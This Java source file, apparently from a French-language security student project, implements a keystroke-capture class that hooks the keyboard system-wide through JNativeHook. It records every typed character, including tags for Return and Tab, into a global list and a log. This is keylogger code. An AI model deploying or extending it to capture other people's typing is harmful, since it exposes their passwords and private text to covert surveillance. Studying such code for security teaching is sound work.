package com.project.m2ssi.enregistreur.implementation;
import org.jnativehook.GlobalScreen;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import com.project.m2ssi.enregistreur.EntreeDuJournal;
import com.project.m2ssi.enregistreur.ResumeEnregistreurDeDonnees;
import com.project.m2ssi.enregistreur.implementation.evenement.EvenementCle;
public final class CharTypedEnregistreur extends ResumeEnregistreurDeDonnees implements NativeKeyListener {
	
	public CharTypedEnregistreur() {
		super();
		GlobalScreen.addNativeKeyListener(this);
	}

	@Override
	public String type() {
		return "CharTyped";
	}

	@Override
	public void fermer() {
		super.fermer();
		GlobalScreen.removeNativeKeyListener(this);
	}

	@Override
	public void nativeKeyPressed(NativeKeyEvent event) {
	}

	@Override
	public void nativeKeyReleased(NativeKeyEvent event) {
	}

	@Override
	public void nativeKeyTyped(NativeKeyEvent event) {

		EvenementCle evenementCle = new EvenementCle(EvenementCle.Type.TYPED, -1, event.getKeyChar());
		String Msg;
		char ch = event.getKeyChar();
		if (ch == '\n' || ch == '\r') {
			Msg = "[Return]";
		} else if (ch == '\t') {
			Msg = "[Tab]";
		} else {
			Msg = Character.toString(ch);
		}
		EnregisteurGlobale.CharTyped.add(Msg);
		EntreeDuJournal entreeDuJournal = new EntreeDuJournal(this, Msg, evenementCle);
		notifierEnregistreurDonneesObservateurs(this, entreeDuJournal);

	}

}
